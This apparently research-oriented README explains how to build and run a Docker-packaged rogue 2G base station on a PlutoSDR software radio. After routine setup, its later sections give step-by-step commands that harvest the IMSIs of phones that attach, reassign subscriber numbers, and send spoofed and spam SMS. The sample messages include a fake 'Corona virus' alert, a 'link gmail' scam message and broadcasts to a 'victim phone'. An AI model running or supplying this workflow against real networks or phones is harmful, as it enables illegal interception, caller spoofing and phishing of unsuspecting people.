# Installing Bulk_gsm on PlutoSDR
# In Terminal 1

## I. Flashing firmware using timestamp mode
[Flashing_firmware](https://github.com/SitrakaResearchAndPOC/osmobts_allsdr_docker/tree/main/plutosdr/firmeware)


## II. Preparing PlutoSDR
```
lsusb | grep "ADALM-PLUTO"
```
Verify if this log exist </br>
`Bus 001 Device 006: ID 0456:b673 Analog Devices, Inc. LibIIO based AD9363 Software Defined Radio [ADALM-PLUTO]`  </br>

Launch : 
```
echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="0456", ATTR{idProduct}=="b673", MODE="666"' | sudo tee /etc/udev/rules.d/90-libiio_pluto.rules
```
Then, 
```
sudo udevadm control --reload-rules
```
```
sudo udevadm trigger
```
Unplug and replug PlutoSDR </br>

## III. Installing tools
```
apt update
```
```
apt install docker.io wget
```
```
apt-get install linux-tools-common linux-tools-generic
```
```
cpupower frequency-set -g performance
```

## IV. Building images
```
rm -rf bulk2g_pluto ; mkdir bulk2g_pluto && cd bulk2g_pluto
```
```
[ -f Dockerfile ] && rm -rf Dockerfile ; \
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/Bulg2g_allsdr_docker/refs/heads/main/plutosdr/Dockerfile
```
```
docker  build -t bulk2g_pluto:v1 .
```

## V. Launching srsran
### DIRECT USB
[screen_shots_usb_direct](https://github.com/SitrakaResearchAndPOC/osmobts_allsdr_docker/tree/main/plutosdr/screenshot_usb_direct)
```
docker rm -f bulk2g_pluto 2> /dev/null ; \
docker run -tid --privileged \
  --cgroupns=host \
  --net=host \
  -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
  -v /dev:/dev \
  -v /dev/bus/usb:/dev/bus/usb \
  -v /tmp/.X11-unix:/tmp/.X11-unix:ro \
  -v /home/user/.Xauthority:/home/user/.Xauthority:ro \
  --tmpfs /run \
  --tmpfs /run/lock \
  --env="DISPLAY=$DISPLAY" \
  --env="LC_ALL=C.UTF-8" \
  --env="LANG=C.UTF-8" \
  --env="NAME_PLUTO=pluto" \
  --cap-add=sys_nice \
  --cap-add=ipc_lock \
  --ulimit rtprio=99 \
  --ulimit memlock=-1 \
  --volume /run/dbus/system_bus_socket:/run/dbus/system_bus_socket \
  --volume /run/avahi-daemon/socket:/run/avahi-daemon/socket \
  --name bulk2g_pluto \
  --hostname bulk2g_pluto \
  bulk2g_pluto:v1
```
CHECK USB CONFIGURATION
```
docker exec -it bulk2g_pluto bash -c \
'bash /root/check_pluto_usb_cfg.sh /opt/src/fork_osmo-trx_soapy/Transceiver52M/test1.cfg'
```

### DIRECT ETHERENET
[screen_shots_ethernet_direct](https://github.com/SitrakaResearchAndPOC/osmobts_allsdr_docker/tree/main/plutosdr/screen_shot_ethernet_direct)
```
export NAME_PLUTO=fishball
```
```
docker rm -f bulk2g_pluto 2> /dev/null ; \
docker run -tid --privileged \
  --cgroupns=host \
  --net=host \
  -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
  -v /dev:/dev \
  -v /dev/bus/usb:/dev/bus/usb \
  -v /tmp/.X11-unix:/tmp/.X11-unix:ro \
  -v /home/user/.Xauthority:/home/user/.Xauthority:ro \
  --tmpfs /run \
  --tmpfs /run/lock \
  --env="DISPLAY=$DISPLAY" \
  --env="LC_ALL=C.UTF-8" \
  --env="LANG=C.UTF-8" \
  --env="NAME_PLUTO=$NAME_PLUTO" \
  --cap-add=sys_nice \
  --cap-add=ipc_lock \
  --ulimit rtprio=99 \
  --ulimit memlock=-1 \
  --volume /run/dbus/system_bus_socket:/run/dbus/system_bus_socket \
  --volume /run/avahi-daemon/socket:/run/avahi-daemon/socket \
  --name bulk2g_pluto \
  --hostname bulk2g_pluto \
  bulk2g_pluto:v1
```
CHECK ETHERNET CONFIGURATION
```
docker exec -it bulk2g_pluto bash -c \
'bash /root/check_pluto_network_cfg.sh /opt/src/fork_osmo-trx_soapy/Transceiver52M/test1.cfg'
```


## VI. Testing PlutoSDR driver
[screen_shot_plutosdr_srsran](https://github.com/SitrakaResearchAndPOC/plutosdr_srsran/tree/main/screen_shot)
```
xhost +
```
Change name of pluto eg : `fishball`
```
export NAME_PLUTO=fishball
```
```
docker exec -ti bulk2g_pluto bash -c 'ping "$NAME_PLUTO.local"'
```
or test ssh
```
ssh-keygen -R "$NAME_PLUTO.local" && docker exec -ti bulk2g_pluto bash -c 'ssh root@"$NAME_PLUTO.local"'
```
</br>
MDP is `analog`

```
docker exec -ti bulk2g_pluto bash -c 'SoapySDRUtil --info'
```
```
docker exec -ti bulk2g_pluto bash -c 'SoapySDRUtil --find'
```
* Over USB
```
docker exec -ti bulk2g_pluto  bash -c 'SoapySDRUtil --probe="driver=plutosdr"'
```
* Over Ethernet
```
docker exec -ti bulk2g_pluto  bash -c 'SoapySDRUtil --probe="driver=plutosdr,hostname=$NAME_PLUTO.local"'
```  

## VII. Launching transceiver
### In terminal 1
```
docker exec -ti bulk2g_pluto bash -c 'osmo-trx-soapy -C /opt/src/fork_osmo-trx_soapy/Transceiver52M/test1.cfg'
```
Tape ctrl+shift+T   </br>

### In terminal 2
launch service   :
```
docker exec -ti bulk2g_pluto bash -c 'cd osmo-nitb-scripts && bash install_services.sh'
```
```
docker exec -ti bulk2g_pluto python3 osmo-nitb-scripts/main_uhd_spoof.py
```
Tape ctrl+shift+T   </br>

### In terminal 3
launch command of : 
* VIII. Testing PlutoSDR SpoofScript1
</br> and / or
* IX. Testing PlutoSDR SpoofScript2

## VIII. Testing PlutoSDR SpoofScript1
```
docker exec -ti bulk2g_pluto bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh
```
You could find imsi and extension </br>
let's see for example IMSI as `646040222463674` and EXTENSION as `126` </br>
```
docker exec -ti bulk2g_pluto  bash osmo-nitb-scripts/scripts_spoof1/set_imsi_extension.sh <IMSI> 0341220590
```
Verify by if the association is correct let's see for example imsi as 646040222463674 and extension as 0341220590
```
docker exec -ti bulk2g_pluto bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone </br>
Search GSM network (on your phone), associate with PLMN MCC `001` && MNC `01` </br>
Tape `*#001#` for finding your phone number (extension with osmo-bts) </br>
```
docker exec -ti bulk2g_pluto  python2 osmo-nitb-scripts/scripts_spoof1/sending_sms_spoof_byextension.py
```
Sending for all extensions in osmo-bts
```
docker exec -ti bulk2g_pluto  python2 osmo-nitb-scripts/scripts_spoof1/sending_sms_broadcast.py 
```
log should be : subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus

## IX. Testing PlutoSDR SpoofScript2
```
docker exec -ti bulk2g_pluto python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
```
You could find imsi and extension Create a virtual extension `0341220590` and send sms to existing EXTENSION eg : `164`
```
docker exec -ti bulk2g_pluto python2 osmo-nitb-scripts/scripts_spoof2/sms_send_source_dest_msg.py 0341220590 <EXTENSION> "link gmail"
```
You could find imsi and extension
```
docker exec -ti bulk2g_pluto python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
```
Creating many extensions for sending a scam sms repeat 3 times
```
docker exec -ti bulk2g_pluto python2 osmo-nitb-scripts/scripts_spoof2/sms_spam.py <EXTENSION> 3 "link gmail"
```
You could find imsi and extension
```
docker exec -ti bulk2g_pluto python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
```
Sending a broadcast sms by using a virtual number as extension `165`
```
docker exec -ti bulk2g_pluto  python2 osmo-nitb-scripts/scripts_spoof2/sms_broadcast.py 165 "link gmail"
```
You could find imsi and extension
```
docker exec -ti bulk2g_pluto  python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py
```

## X. Testing PlutoSDR Fake SMS Sender
### In terminal 1
```
ping 192.168.20.1
```
```
docker exec -ti btspluto bash -c 'ping 192.168.20.1'
```
```
docker exec -ti btspluto bash -c '$SRS_INSTALL/bin/SoapySDRUtil --info'
```
```
docker exec -ti btspluto bash -c '$SRS_INSTALL/bin/SoapySDRUtil --find'
```
```
docker exec -ti btspluto bash -c 'osmo-trx-soapy -C /opt/src/fork_osmo-trx_soapy/Transceiver52M/test1.cfg'
```
Tape ctrl+shift+T   </br>

### In terminal 2

launch service   :
```
docker exec -ti bulk2g_pluto bash -c 'cd osmo-nitb-scripts && bash install_services.sh'
```
```
docker exec -ti bulk2g_pluto python3 osmo-nitb-scripts/main_uhd.py
```
Add victim phone and tape Tape ctrl+shift+T

### In terminal 3
* Visualizing confguration
```
docker exec -ti bulk2g_pluto  cat osmo-nitb-scripts/interact.py
```
```
docker exec -ti bulk2g_pluto  cat /config.json
```
Change the the paramater default for add_argument in `/var/lib/osmocom/hlr.sqlite3`
* Launching fake sms sender
```
docker exec -ti bulk2g_pluto  python3 osmo-nitb-scripts/interact.py -c /config.json
```
```
docker exec -ti bulk2g_pluto  python3 osmo-nitb-scripts/interact.py -c /config.json -e <extension>
```



